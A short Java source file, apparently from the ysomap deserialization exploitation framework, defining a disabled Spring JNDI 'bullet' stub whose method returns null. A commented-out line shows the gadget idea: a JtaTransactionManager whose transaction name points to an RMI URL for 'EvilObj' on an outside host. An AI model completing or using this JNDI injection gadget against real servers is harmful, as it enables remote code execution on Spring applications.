package ysomap.core.bullet.spring;

import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * @author wh1t3P1g
 * @since 2020/6/6
 */
//@Bullets
public class SpringJNDI extends Bullet<Object> {

    @NotNull
    @Require(name = "jndi", detail = "")
    public String jndi;


    @Override
    public Object getObject() throws Exception {
//        JtaTransactionManager manager = new JtaTransactionManager();
//        manager.setUserTransactionName("rmi://192.168.31.88:8888/EvilObj");
        return null;
    }
}
